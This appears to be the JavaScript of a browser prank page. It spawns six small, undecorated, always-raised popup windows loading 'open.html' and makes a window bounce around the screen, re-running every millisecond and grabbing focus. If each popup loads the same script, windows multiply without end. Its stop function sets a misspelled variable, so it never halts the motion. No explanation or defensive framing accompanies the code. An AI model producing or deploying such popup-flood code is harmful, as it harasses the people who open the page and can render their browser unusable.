

		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function openWindow(url){
        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
}

function procreate(){
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		}

function newXlt(){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus()}

function newXrt(){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }

function newYup(){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }

function newYdn(){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }
function fOff(){
        flagrun = 0;
        }

function playBall(){
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width-175){
        newXlt();
        }
        if (xPos < 0){
        newXrt();
        }
        if (yPos > screen.height-100){
        newYup();
        }
        if (yPos < 0){
        newYdn();
        }
        if (flagRun == 1){
        window.moveTo(xPos,yPos);
        setTimeout('playBall()',1);
        }
        }
